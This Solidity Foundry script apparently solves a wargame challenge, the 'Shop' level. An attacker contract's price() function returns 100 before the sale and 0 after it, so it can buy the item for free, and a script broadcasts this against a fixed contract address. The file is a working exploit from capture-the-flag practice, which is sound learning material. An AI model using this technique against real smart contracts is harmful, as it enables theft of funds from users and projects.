// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "../src/Shop.sol";
import {Script, console} from "forge-std/Script.sol";

contract Attack is Buyer {
    Shop public shop;

    constructor(address _shop) {
        shop = Shop(_shop);
    }

    function price() external view returns (uint256) {
        return shop.isSold() ? 0 : 100;
    }

    function attack() public {
        shop.buy();
    }
}

contract ShopScript is Script {

    address private constant SHOP_ADDRESS = 0xc28A7E3A97c043383e2F1121B263eFF74c920b7a;

    function run() public {
        vm.startBroadcast();

        console.log("before");
        console.log("isSold: %s", Shop(SHOP_ADDRESS).isSold());
        console.log("buyer price: %d", Shop(SHOP_ADDRESS).price());

        Attack attack = new Attack(SHOP_ADDRESS);
        attack.attack();

        console.log("after");
        console.log("isSold: %s", Shop(SHOP_ADDRESS).isSold());
        console.log("buyer price: %d", Shop(SHOP_ADDRESS).price());

        vm.stopBroadcast();
    }
}
